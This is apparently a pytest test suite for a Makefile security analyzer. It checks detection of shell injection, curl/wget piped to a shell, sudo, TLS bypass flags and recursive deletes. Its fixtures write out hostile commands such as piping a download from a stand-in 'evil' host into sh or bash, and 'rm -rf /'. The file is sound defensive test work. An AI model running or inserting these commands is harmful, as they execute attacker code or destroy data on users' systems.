"""
Test suite for Makefile Analyzer.
Tests MF001-MF005 security rules.
"""

import pytest

from hefesto.analyzers.devops.makefile_analyzer import MakefileAnalyzer


@pytest.fixture
def analyzer():
    return MakefileAnalyzer()


class TestMF001ShellInjection:
    """Tests for MF001: Shell injection / dynamic execution."""

    def test_eval_with_expansion_detected(self, analyzer):
        """eval with expansion should trigger MF001."""
        content = "all:\n\teval $(CMD)\n"
        issues = analyzer.analyze("Makefile", content)
        assert any(i.rule_id == "MF001" for i in issues)

    def test_shell_c_with_interpolation_detected(self, analyzer):
        """bash -c with interpolation should trigger MF001."""
        content = 'all:\n\tbash -c "doit $CMD"\n'
        issues = analyzer.analyze("Makefile", content)
        assert any(i.rule_id == "MF001" for i in issues)

    def test_xargs_shell_detected(self, analyzer):
        """xargs with shell should trigger MF001."""
        content = "all:\n\techo foo | xargs sh -c\n"
        issues = analyzer.analyze("Makefile", content)
        assert any(i.rule_id == "MF001" for i in issues)

    def test_non_recipe_line_ignored(self, analyzer):
        """Non-recipe lines should be ignored."""
        content = "CMD = rm -rf /\n"
        issues = analyzer.analyze("Makefile", content)
        assert len(issues) == 0


class TestMF002CurlPipeShell:
    """Tests for MF002: curl/wget piped to shell."""

    def test_curl_pipe_sh_detected(self, analyzer):
        """curl | sh should trigger MF002."""
        content = "install:\n\tcurl -fsSL https://evil | sh\n"
        issues = analyzer.analyze("Makefile", content)
        assert any(i.rule_id == "MF002" for i in issues)

    def test_wget_pipe_bash_detected(self, analyzer):
        """wget | bash should trigger MF002."""
        content = "install:\n\twget -qO- https://evil | bash\n"
        issues = analyzer.analyze("Makefile", content)
        assert any(i.rule_id == "MF002" for i in issues)

    def test_pipe_to_non_shell_safe(self, analyzer):
        """Pipe to non-shell should NOT trigger MF002."""
        content = "all:\n\tcurl -fsSL https://example.com | cat\n"
        issues = analyzer.analyze("Makefile", content)
        assert not any(i.rule_id == "MF002" for i in issues)

    def test_commented_recipe_line_ignored(self, analyzer):
        """Commented recipe lines should be ignored."""
        content = "all:\n\t# curl https://evil | sh\n"
        issues = analyzer.analyze("Makefile", content)
        assert len(issues) == 0


class TestMF003SudoUsage:
    """Tests for MF003: sudo usage in recipes."""

    def test_sudo_detected(self, analyzer):
        """sudo in recipe should trigger MF003."""
        content = "deps:\n\tsudo apt-get update\n"
        issues = analyzer.analyze("Makefile", content)
        assert any(i.rule_id == "MF003" for i in issues)

    def test_no_sudo_safe(self, analyzer):
        """No sudo should NOT trigger MF003."""
        content = "deps:\n\tapt-get update\n"
        issues = analyzer.analyze("Makefile", content)
        assert not any(i.rule_id == "MF003" for i in issues)


class TestMF004TLSBypass:
    """Tests for MF004: TLS/certificate bypass."""

    def test_curl_insecure_detected(self, analyzer):
        """curl -k should trigger MF004."""
        content = "fetch:\n\tcurl -k https://example.com\n"
        issues = analyzer.analyze("Makefile", content)
        assert any(i.rule_id == "MF004" for i in issues)

    def test_curl_insecure_long_flag_detected(self, analyzer):
        """curl --insecure should trigger MF004."""
        content = "fetch:\n\tcurl --insecure https://example.com\n"
        issues = analyzer.analyze("Makefile", content)
        assert any(i.rule_id == "MF004" for i in issues)

    def test_wget_no_check_certificate_detected(self, analyzer):
        """wget --no-check-certificate should trigger MF004."""
        content = "fetch:\n\twget --no-check-certificate https://example.com\n"
        issues = analyzer.analyze("Makefile", content)
        assert any(i.rule_id == "MF004" for i in issues)

    def test_git_sslverify_false_detected(self, analyzer):
        """git sslVerify=false should trigger MF004."""
        content = "fetch:\n\tgit -c http.sslVerify=false clone https://example.com/repo.git\n"
        issues = analyzer.analyze("Makefile", content)
        assert any(i.rule_id == "MF004" for i in issues)

    def test_tls_safe(self, analyzer):
        """Normal curl should NOT trigger MF004."""
        content = "fetch:\n\tcurl https://example.com\n"
        issues = analyzer.analyze("Makefile", content)
        assert not any(i.rule_id == "MF004" for i in issues)


class TestMF005DangerousRm:
    """Tests for MF005: Dangerous deletes."""

    def test_rm_rf_root_detected(self, analyzer):
        """rm -rf / should trigger MF005."""
        content = "clean:\n\trm -rf /;\n"
        issues = analyzer.analyze("Makefile", content)
        assert any(i.rule_id == "MF005" for i in issues)

    def test_rm_rf_glob_root_detected(self, analyzer):
        """rm -rf /* should trigger MF005."""
        content = "clean:\n\trm -rf /*\n"
        issues = analyzer.analyze("Makefile", content)
        assert any(i.rule_id == "MF005" for i in issues)

    def test_rm_rf_variable_detected(self, analyzer):
        """rm -rf $(VAR) should trigger MF005."""
        content = "clean:\n\trm -rf $(DEST)\n"
        issues = analyzer.analyze("Makefile", content)
        assert any(i.rule_id == "MF005" for i in issues)

    def test_rm_safe_non_recursive(self, analyzer):
        """Non-recursive rm should NOT trigger MF005."""
        content = "clean:\n\trm file.tmp\n"
        issues = analyzer.analyze("Makefile", content)
        assert not any(i.rule_id == "MF005" for i in issues)


class TestLineNumberAccuracy:
    """Tests for accurate line number reporting."""

    def test_line_number_for_recipe(self, analyzer):
        """Line numbers should be accurate."""
        content = "a:\n\techo ok\nb:\n\tcurl -fsSL https://evil | sh\n"
        issues = analyzer.analyze("Makefile", content)
        mf002 = [i for i in issues if i.rule_id == "MF002"]
        assert len(mf002) >= 1
        # curl|sh is on line 4
        assert mf002[0].line == 4
